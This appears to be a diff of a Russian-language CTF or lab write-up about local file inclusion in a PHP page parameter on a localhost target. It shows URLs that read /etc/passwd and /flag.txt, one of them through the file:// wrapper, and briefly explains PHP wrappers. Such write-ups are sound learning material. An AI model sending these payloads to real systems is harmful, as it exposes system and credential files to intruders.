@@ -14,3 +14,12 @@ http://localhost:20010/?page=/etc/passwd
 ```
 http://localhost:20010/?page=/flag.txt
 ```
+
+Еще получилось использовать враппер:
+
+```
+http://localhost:20010/?page=file:///etc/passwd
+```
+
+Врапперы -- это что-то типа протоколов в php, которые говорят о том, как обращаться с данными.
+
